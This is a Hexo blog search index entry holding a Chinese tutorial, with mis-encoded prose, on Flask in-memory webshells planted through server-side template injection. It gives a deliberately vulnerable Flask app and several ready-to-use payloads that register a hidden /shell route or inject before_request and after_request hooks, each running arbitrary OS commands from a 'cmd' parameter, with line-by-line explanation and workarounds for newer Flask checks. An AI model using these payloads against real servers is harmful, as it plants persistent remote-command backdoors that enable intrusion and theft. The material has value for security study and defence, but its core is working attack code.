<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python flaskå†…å­˜é©¬å­¦ä¹ </title>
      <link href="/2025/02/03/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/03/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><p><strong>å†…å­˜é©¬</strong>ï¼Œä¹Ÿè¢«ç§°ä¸º<strong>æ— æ–‡ä»¶é©¬</strong>ï¼Œæ˜¯æ— æ–‡ä»¶æ”»å‡»çš„ä¸€ç§å¸¸ç”¨æ‰‹æ®µã€‚</p><p>å¸¸ç”¨çš„pythonæ¡†æ¶æœ‰<code>Django</code>ã€<code>flask</code>ï¼Œè€Œè¿™ä¸¤ç§æ¡†æ¶éƒ½å¯èƒ½å­˜åœ¨SSTIæ¼æ´ã€‚**<code>python å†…å­˜é©¬</code><strong>å°±æ˜¯åˆ©ç”¨flaskæ¡†æ¶ä¸­</strong>SSTI<strong>æˆ–è€…</strong>pickleååºåˆ—åŒ–**æ¥å®ç°çš„ï¼Œé€šè¿‡æ·»åŠ æ–°çš„è·¯ç”±è®¿é—®è¯¥è·¯ç”±å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p><h1 id="è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶"><a href="#è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶" class="headerlink" title="è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶"></a>è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶</h1><p>å½“ç½‘é¡µè¯·æ±‚è¿›å…¥flaskæ—¶ï¼Œä¼šå®ä¾‹åŒ–ä¸€ä¸ª<code>requset context</code>.åœ¨pythonä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡ï¼š<strong>è¯·æ±‚ä¸Šä¸‹æ–‡(request context)ã€åº”ç”¨ä¸Šä¸‹æ–‡(session context).<strong>ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯ï¼Œè€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ªstackçš„æ ˆç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§ã€‚</strong><code>request context</code>å®ä¾‹åŒ–åä¼šè¢«pushåˆ°æ ˆ<code>_request_ctx_stack</code>ä¸­ï¼ŒåŸºäºæ­¤ç‰¹æ€§ä¾¿å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚.</strong></p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>åˆ©ç”¨flaskç¼–å†™ä¸€ä¸ªSSTIä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>åŸå§‹flaskå†…å­˜é©¬payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å°†Payloadæ‹†å¼€æ¥, é€å±‚åˆ†æï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å‰é¢çš„**<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code><strong>ä¸­ï¼Œ<code>url_for</code>æ˜¯flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨<code>__globals__</code>å±æ€§ï¼Œ</strong><code>__globals__</code>èƒ½è¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡<strong>ï¼Œå…¶ä¸­åŒ…æ‹¬å¾ˆå¤šå·²ç»å¼•ç”¨çš„æ¨¡å—ï¼Œè€Œè¿™é‡Œæ˜¯æœ‰<code>__builtins__</code>çš„ï¼Œè€Œ</strong><code>__builtins__</code>ä¸­åŒ…å«å¾ˆå¤šå†…å»ºå‡½æ•°**ï¼Œå…¶ä¸­åŒ…æ‹¬å‘½ä»¤æ‰§è¡Œå‡½æ•°<code>eval()</code>ã€‚å³è¿™ä¸€æ­¥ä¸»è¦æ˜¯ä¸ºäº†è·å–å‘½ä»¤æ‰§è¡Œå‡½æ•°<code>eval()</code>ï¼Œå½“ç„¶é‡‡ç”¨SSTIå…¶ä»–payloadè·å–è¯¥å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>è€Œåé¢çš„**<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>ç”¨äºåŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„è·¯ç”±è§„åˆ™ã€‚**</p><p>åœ¨flaskä¸­æˆ‘ä»¬é€šå¸¸ä½¿ç”¨**<code>@app.route()</code><strong>è£…é¥°å™¨æ¥æ·»åŠ è·¯ç”±ï¼Œè€Œå…¶ä¹Ÿæ˜¯è°ƒç”¨äº†<code>add_url_rule</code>å‡½æ•°æ¥æ·»åŠ è·¯ç”±çš„ã€‚</strong><code>app.add_url_rule</code>** æä¾›äº†æ›´ä¸ºåº•å±‚å’Œçµæ´»çš„æ–¹å¼æ¥å®šä¹‰è·¯ç”±ï¼Œå°¤å…¶é€‚åˆåœ¨åŠ¨æ€æˆ–ç¨‹åºåŒ–åœºæ™¯ä¸‹ä½¿ç”¨ã€‚</p><p><img src="D:\Typora\images\20220224144721-9de02122-953d-1.png"></p><blockquote><ul><li>rule: å‡½æ•°å¯¹åº”çš„<code>URL</code>è§„åˆ™, æ»¡è¶³æ¡ä»¶å’Œ<code>app.route</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·, å¿…é¡»ä»¥<code>/</code>å¼€å¤´.</li><li>endpoint: ç«¯ç‚¹, å³åœ¨ä½¿ç”¨<code>url_for</code>è¿›è¡Œåè½¬çš„æ—¶å€™, è¿™é‡Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯<code>endpoint</code>å¯¹åº”çš„å€¼, è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®š, é»˜è®¤å°±ä¼šä½¿ç”¨å‡½æ•°çš„åå­—ä½œä¸º<code>endpoint</code>çš„å€¼.</li><li>view_func: <code>URL</code>å¯¹åº”çš„å‡½æ•°, è¿™é‡Œåªéœ€å†™å‡½æ•°åå­—è€Œä¸ç”¨åŠ æ‹¬å·.</li><li>provide_automatic_options: æ§åˆ¶æ˜¯å¦åº”è‡ªåŠ¨æ·»åŠ é€‰é¡¹æ–¹æ³•.</li><li>options: è¦è½¬å‘åˆ°åŸºç¡€è§„åˆ™å¯¹è±¡çš„é€‰é¡¹.</li></ul></blockquote><p>è€Œè¿™é‡Œ<code>&#39;/shell&#39;</code>æŒ‡è·¯ç”±çš„è·¯å¾„ã€‚<code>shell</code>æ˜¯è·¯ç”±è§„åˆ™çš„åç§°ï¼Œå®ƒæ˜¯è¿™ä¸ªè·¯ç”±çš„æ ‡è¯†ç¬¦ï¼Œå¯ä»¥åœ¨å…¶ä»–åœ°æ–¹å¼•ç”¨ã€‚**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>åˆ™æ˜¯è¯¥è·¯ç”±å¯¹åº”çš„å‡½æ•°ï¼Œè¿™é‡Œå®šä¹‰çš„ä¸€ä¸ªåŒ¿åå‡½æ•°<code>lambda</code>ï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œ</strong>é€šè¿‡<code>_request_ctx_stack.top</code>æŒ‡å‘è¯·æ±‚ä¸Šä¸‹æ–‡æ ˆçš„é¡¶éƒ¨å…ƒç´ ï¼Œå³å½“å‰æ­£åœ¨å¤„ç†çš„è¯·æ±‚ï¼Œå†é€šè¿‡<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>è·å–è¯·æ±‚ä¸­cmdå‚æ•°çš„å€¼ï¼Œé»˜è®¤ä¸º<code>whoami</code>ï¼Œé€šè¿‡<code>read()</code>æ ‡å‡†è¾“å‡ºï¼Œä»è€Œè¾¾åˆ°æ·»åŠ è·¯ç”±åšåˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œ**</p><p>å†æ¥çœ‹çœ‹<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>è¿™ä¸€æˆª<code>Payload</code>ã€‚ <strong><code>_request_ctx_stack</code><strong>æ˜¯<code>Flask</code>çš„ä¸€ä¸ªå…¨å±€å˜é‡, æ˜¯ä¸€ä¸ª<code>LocalStack</code>å®ä¾‹, è¿™é‡Œçš„<code>_request_ctx_stack</code>å³ä¸Šæ–‡ä¸­æåˆ°çš„<code>Flask è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶</code>ä¸­çš„<code>_request_ctx_stack</code>ã€‚</strong><code>app</code>ä¹Ÿæ˜¯<code>Flask</code>çš„ä¸€ä¸ªå…¨å±€å˜é‡, è¿™é‡Œå³è·å–å½“å‰çš„<code>app</code>ã€‚</strong>è¿™é‡ŒæŒ‡æ˜äº†æ‰€éœ€å˜é‡çš„å…¨å±€å‘½åç©ºé—´, ä¿è¯<code>app</code>å’Œ<code>_request_ctx_stack</code>éƒ½å¯ä»¥è¢«æ‰¾åˆ°ã€‚</p><blockquote><p>è¿™é‡Œappçš„è·å–ä¹Ÿå¯ä»¥é€šè¿‡**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p></blockquote><h1 id="add-url-ruleçš„å±€é™"><a href="#add-url-ruleçš„å±€é™" class="headerlink" title="add_url_ruleçš„å±€é™"></a>add_url_ruleçš„å±€é™</h1><p>ä¸Šé¢çš„payloadåªé’ˆå¯¹æ—§ç‰ˆï¼Œä½†ç”±äºæ–°ç‰ˆå…³é—­debugæ¨¡å¼ä¼šè°ƒç”¨checkå‡½æ•°ï¼Œå³<code>_check_setup_finished()</code>å‡½æ•°å¼•èµ·æŠ¥é”™</p><p><img src="D:\Typora\images\20240517205629-e0ca0558-144c-1.png"></p><p>æ„æ€å°±æ˜¯è¿™ä¸ªappå·²ç»è·‘èµ·æ¥äº†,è¿™ä¸ªå‡½æ•°å°±ä¸èƒ½å†è¢«è°ƒç”¨äº†.è°ƒè¯•ä¹‹åå‘ç°è¿™ä¸ªæ–¹æ³•çš„<code>@setupmethod</code>è£…é¥°å™¨ä¼šå…ˆcheckä¸€æ¬¡,æ‰€ä»¥åŸºæœ¬ä¸Šæ˜¯å®Œå…¨ä¸èƒ½ç”¨äº†.</p><p>æ‰€ä»¥æ—§ç‰ˆä¸èƒ½ç”¨çš„å¤§è‡´åŸå› æ˜¯å› ä¸ºåœ¨å¯ä»¥åŠ¨æ€æ·»åŠ è·¯ç”±å’Œé”™è¯¯å¤„ç†é€»è¾‘(å¦‚<code>register_error_handler()</code>æ–¹æ³•)éƒ½è¢«**<code>@setupmethod</code>è£…é¥°å™¨ä¿®é¥°<strong>äº†,è€Œ<code>@setupmethod</code>è£…é¥°å™¨ä¼šåœ¨Flaskè·‘èµ·æ¥ä¹‹å‰å°±æŠŠè¿™äº›æ–¹æ³•éƒ½åŠ åˆ°ä¸€ä¸ªè¢«checkçš„åå•é‡Œ,ä»¥å</strong>å†è¢«è°ƒç”¨çš„è¯å°±ä¼šè¢«<code>@setupmethod</code>è¿™ä¸ªè£…é¥°å™¨ç»™checkç„¶åæŠ¥é”™**</p><p>æ‰€ä»¥add_url_ruleå°±ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå°±éœ€è¦å…¶ä»–æ–¹æ³•æŒ‚å†…å­˜ğŸ</p><h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>pythonè£…é¥°å™¨ï¼šè£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡(å‡½æ•°æˆ–ç±»), å®ƒæ¥æ”¶ä¸€ä¸ªå‡½æ•°æˆ–ç±»åº§ä½å‚æ•°,å¹¶è¿”å›ä¸€ä¸ªæ–°çš„å‡½æ•°æˆ–ç±».è¿™ä¸ªæ–°çš„å‡½æ•°æˆ–ç±»é€šå¸¸ä¼šä¿ç•™åŸå§‹å‡½æ•°æˆ–ç±»çš„åŠŸèƒ½,ä½†ä¼šåœ¨å…¶åŸºç¡€ä¸Šæ·»åŠ ä¸€äº›é¢å¤–çš„é€»è¾‘.</strong></p><p>åœ¨flaskä¸­ï¼Œ**<code>before_request</code>æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒç”¨äºåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œç‰¹å®šçš„å‡½æ•°**ã€‚è¿™ä¸ªè£…é¥°å™¨å…è®¸å¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼Œæ¯”å¦‚è®¤è¯æ£€æŸ¥ã€æ—¥å¿—è®°å½•ã€è®¾ç½®å“åº”å¤´ç­‰ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š<br><img src="D:\Typora\images\QQ20241231-202231.png"></p><p>è¿™é‡ŒéªŒè¯è¯·æ±‚å¤´æ˜¯å¦åŒ…å«<code>Authorization</code>å­—æ®µï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è¿”å›æœªæˆæƒçš„é”™è¯¯å“åº”(401)</p><p><img src="D:\Typora\images\image-20240515013857705.png"></p><p>å¯ä»¥çœ‹åˆ°<code>before_request</code>å®é™…ä¸Šè°ƒç”¨çš„æ˜¯**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**ï¼Œå…¶æ„æ€æ˜¯ï¼š</p><ul><li>æ£€æŸ¥ <code>self.before_request_funcs</code> å­—å…¸ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªé”®ä¸º <code>None</code> çš„æ¡ç›®ã€‚</li><li>å¦‚æœæ²¡æœ‰ <code>None</code> é”®ï¼Œå°±åœ¨å­—å…¸ä¸­åˆ›å»ºå®ƒï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸€ä¸ªç©ºåˆ—è¡¨ã€‚</li><li><strong>ç„¶åï¼Œæ— è®º <code>None</code> é”®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½å°†å‡½æ•° <code>f</code> æ·»åŠ åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚</strong></li></ul><p>è¿™ä¸ªå‡½æ•°få°±æ˜¯æˆ‘ä»¬è¦æ·»åŠ çš„å‡½æ•°ã€‚</p><p>è€Œè¯¥å‡½æ•°å°±æ·»åŠ ä¹‹å‰payloadçš„lambdaåŒ¿åå‡½æ•°å³å¯</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>ä¸<code>before_request</code>ç±»ä¼¼ã€‚<code>after_request</code>æ–¹æ³•å…è®¸æˆ‘ä»¬åœ¨æ¯ä¸ªè¯·æ±‚ä¹‹åæ‰§è¡Œä¸€äº›æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ–¹æ³•æ¥æ·»åŠ ä¸€äº›å“åº”å¤´ã€è®°å½•è¯·æ±‚æ—¥å¿—ç­‰ä»»åŠ¡</p><p><img src="D:\Typora\images\20240517205714-fba76f64-144c-1.png"></p><p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>ä¼ å…¥çš„få°±æ˜¯å¯¹åº”çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œä½†è¿™é‡Œçš„féœ€è¦æ¥æ”¶ä¸€ä¸ªresponseå¯¹è±¡ï¼ŒåŒæ—¶è¿”å›ä¸€ä¸ªresponseå¯¹è±¡ã€‚</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><p>é€è¡Œè§£é‡Šè¿™æ®µä»£ç :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#ä¼ å…¥å‚æ•°</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#å¦‚æœè¯·æ±‚å‚æ•°å«æœ‰cmdåˆ™è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡,æ–¹ä¾¿è·å–</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #åˆ›å»ºä¸€ä¸ªå“åº”å¯¹è±¡</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#æ’çœŸ</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#å¦‚æœè¯·æ±‚å‚æ•°æ²¡æœ‰cmdåˆ™æ­£å¸¸è¿”å›</span></span><br><span class="line"><span class="comment">#è¿™é‡Œçš„cmdå‚æ•°åå’Œrå˜é‡åéƒ½æ˜¯å¯ä»¥æ”¹çš„</span></span><br></pre></td></tr></table></figure><p>ä¸å¸¦å‡ºå›æ˜¾ï¼Œé€‚ç”¨äºè¿‡æ»¤ä¸¥æ ¼çš„åœºæ™¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure><h1 id="Flaskä¸­çš„å…¶ä»–é’©å­å‡½æ•°"><a href="#Flaskä¸­çš„å…¶ä»–é’©å­å‡½æ•°" class="headerlink" title="Flaskä¸­çš„å…¶ä»–é’©å­å‡½æ•°"></a>Flaskä¸­çš„å…¶ä»–é’©å­å‡½æ•°</h1><p>å…¶å®<code>after_request()</code>å’Œ<code>before_request()</code>æœ‰ä¸€ä¸ªå…±åŒçš„åˆ†ç±»å«é’©å­å‡½æ•°.é’©å­å‡½æ•°æ˜¯æŒ‡åœ¨æ‰§è¡Œå‡½æ•°å’Œç›®æ ‡å‡½æ•°ä¹‹é—´æŒ‚è½½çš„å‡½æ•°,æ¡†æ¶å¼€å‘è€…ç»™è°ƒç”¨æ–¹æä¾›ä¸€ä¸ªpoint-æŒ‚è½½ç‚¹,è‡³äºæŒ‚è½½ä»€ä¹ˆå‡½æ•°ç”±è°ƒç”¨æ–¹å†³å®š.</p><p><strong>@before_first_request</strong></p><p>åœ¨å¯¹åº”ç”¨ç¨‹åºå®ä¾‹çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¹‹å‰æ³¨å†Œè¦è¿è¡Œçš„å‡½æ•°,åªä¼šè¿è¡Œä¸€æ¬¡.</p><p><strong>@before_request</strong></p><p>åœ¨æ¯ä¸ªè¯·æ±‚ä¹‹å‰æ³¨å†Œä¸€ä¸ªè¦è¿è¡Œçš„å‡½æ•°,æ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šæ‰§è¡Œä¸€æ¬¡.</p><p><strong>@after_request</strong></p><p>åœ¨æ¯ä¸ªè¯·æ±‚ä¹‹åæ³¨å†Œä¸€ä¸ªè¦è¿è¡Œçš„å‡½æ•°,æ¯æ¬¡è¯·æ±‚å®Œæˆåéƒ½ä¼šæ‰§è¡Œ.éœ€è¦æ¥æ”¶ä¸€ä¸ª Response å¯¹è±¡ä½œä¸ºå‚æ•°,å¹¶è¿”å›ä¸€ä¸ªæ–°çš„ Response å¯¹è±¡,æˆ–è€…è¿”å›æ¥æ”¶çš„ Response å¯¹è±¡.</p><p><strong>@teardown_request</strong></p><p>æ³¨å†Œåœ¨æ¯ä¸€ä¸ªè¯·æ±‚çš„æœ«å°¾,ä¸ç®¡æ˜¯å¦æœ‰å¼‚å¸¸,æ¯æ¬¡è¯·æ±‚çš„æœ€åéƒ½ä¼šæ‰§è¡Œ.</p><p><strong>@context_processor</strong></p><p>ä¸Šä¸‹æ–‡å¤„ç†å™¨,è¿”å›çš„å­—å…¸å¯ä»¥åœ¨å…¨éƒ¨çš„æ¨¡æ¿ä¸­ä½¿ç”¨.</p><p><strong>@template_filter(â€˜upperâ€™)</strong></p><p>å¢åŠ æ¨¡æ¿è¿‡æ»¤å™¨,å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨è¯¥å‡½æ•°,åé¢çš„å‚æ•°æ˜¯åç§°,åœ¨æ¨¡æ¿ä¸­ç”¨åˆ°.</p><p><strong>@errorhandler(400)</strong></p><p>å‘ç”Ÿä¸€äº›å¼‚å¸¸æ—¶,æ¯”å¦‚404,500,æˆ–è€…æŠ›å‡ºå¼‚å¸¸(Exception)ä¹‹ç±»çš„,å°±ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥é’©å­å‡½æ•°.</p><p>1.å‘ç”Ÿè¯·æ±‚é”™è¯¯æ—¶,æ¡†æ¶ä¼šè‡ªåŠ¨è°ƒç”¨ç›¸åº”çš„é’©å­å‡½æ•°,å¹¶å‘é’©å­å‡½æ•°ä¸­ä¼ å…¥errorå‚æ•°.</p><p>2.å¦‚æœé’©å­å‡½æ•°æ²¡æœ‰å®šä¹‰errorå‚æ•°,å°±ä¼šæŠ¥é”™.</p><p>3.å¯ä»¥ä½¿ç”¨<code>abort(http status code)</code>å‡½æ•°æ¥æ‰‹åŠ¨ç»ˆæ­¢è¯·æ±‚æŠ›å‡ºå¼‚å¸¸,å¦‚æœè¦æ˜¯å‘ç”Ÿå‚æ•°é”™è¯¯,å¯ä»¥abort(404)ä¹‹ç±»çš„.</p><p><strong>@teardown_appcontext</strong></p><p>ä¸ç®¡æ˜¯å¦æœ‰å¼‚å¸¸,æ³¨å†Œçš„å‡½æ•°éƒ½ä¼šåœ¨æ¯æ¬¡è¯·æ±‚ä¹‹åæ‰§è¡Œ.flask ä¸ºä¸Šä¸‹æ–‡æä¾›äº†ä¸€ä¸ª<code>teardown_appcontext</code>é’©å­,ä½¿ç”¨å®ƒæ³¨å†Œçš„æ¯æ‰å‡½æ•°ä¼šåœ¨ç¨‹åºä¸Šä¸‹æ–‡è¢«é”€æ¯æ—¶è°ƒç”¨,é€šå¸¸ä¹Ÿåœ¨è¯·æ±‚ä¸Šä¸‹æ–‡è¢«é”€æ¯æ—¶è°ƒç”¨.æŸäº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°å’Œ**@teardown_request**çš„è¡Œä¸ºæ˜¯ç±»ä¼¼çš„,ä¸€ä¸ªæ˜¯è¯·æ±‚ä¸Šä¸‹æ–‡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨,å¦ä¸€ä¸ªæ˜¯åº”ç”¨ä¸Šä¸‹æ–‡è¢«é”€æ¯æ—¶è°ƒç”¨.</p><p>æ¯”å¦‚ä½ éœ€è¦åœ¨æ¯ä¸ªè¯·æ±‚å¤„ç†ç»“æŸåé”€æ¯æ•°æ®åº“è¿æ¥ï¼šapp.teardown_appcontext 